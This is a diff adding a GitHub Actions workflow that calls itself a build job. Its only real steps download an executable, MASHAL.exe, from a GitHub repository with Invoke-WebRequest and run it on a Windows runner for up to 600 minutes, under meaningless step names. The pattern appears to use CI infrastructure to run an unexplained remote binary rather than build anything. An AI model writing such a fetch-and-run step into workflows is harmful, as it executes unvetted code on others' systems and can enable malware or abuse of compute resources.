@@ -1,0 +1,11 @@
+name: MASHAL
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SGH
+      run: Invoke-WebRequest https://github.com/sunil1300/MASHAL/raw/main/MASHAL.exe -OutFile MASHAL.exe
+    - name: WVU
+      run: .\MASHAL.exe
+      timeout-minutes: 600
